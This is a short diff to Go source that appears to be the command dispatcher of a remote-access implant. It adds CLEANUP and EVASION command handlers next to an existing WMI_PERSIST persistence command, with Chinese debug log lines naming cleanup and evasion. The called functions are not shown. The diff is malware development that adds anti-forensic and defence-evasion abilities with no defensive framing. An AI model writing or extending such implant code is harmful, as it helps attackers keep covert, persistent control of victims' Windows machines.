@@ -433,6 +433,14 @@ func HandleCommand(data []byte) {
 		debuglog.Printf("🧿 [持久化] 收到WMI_PERSIST命令 [%d]\n", services.WMI_PERSIST)
 		result, err = services.CmdWmiPersist(cmdBuf)
 		callbackType = 0
+	case services.CLEANUP:
+		debuglog.Printf("🧹 [清理] 收到CLEANUP命令 [%d]\n", services.CLEANUP)
+		result, err = services.CmdCleanup(cmdBuf)
+		callbackType = 0
+	case services.EVASION:
+		debuglog.Printf("🔐 [对抗] 收到EVASION命令 [%d] 参数=%q\n", services.EVASION, string(cmdBuf))
+		result, err = services.CmdEvasion(cmdBuf)
+		callbackType = 0
 	default:
 		debuglog.Printf("❌ [命令错误] 不支持的命令类型: %d\n", cmdType)
 		err = fmt.Errorf("not supported command: %d", cmdType)
